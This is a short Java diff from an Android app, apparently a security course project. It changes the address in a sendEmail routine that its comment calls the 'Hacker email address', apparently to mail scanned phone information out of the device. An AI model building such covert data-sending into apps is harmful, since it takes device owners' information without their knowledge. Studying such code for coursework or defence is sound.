@@ -256,7 +256,7 @@ public class MainActivity extends AppCompatActivity {
 
     private void sendEmail(){
         //Getting content for email
-        String email = "2901.2019@gmail.com"; //Hacker email address
+        String email = "ict2207.2019@gmail.com"; //Hacker email address
         String subject = "MobileDevice Scanned Result  ";
 
         //Retrieve Phone information
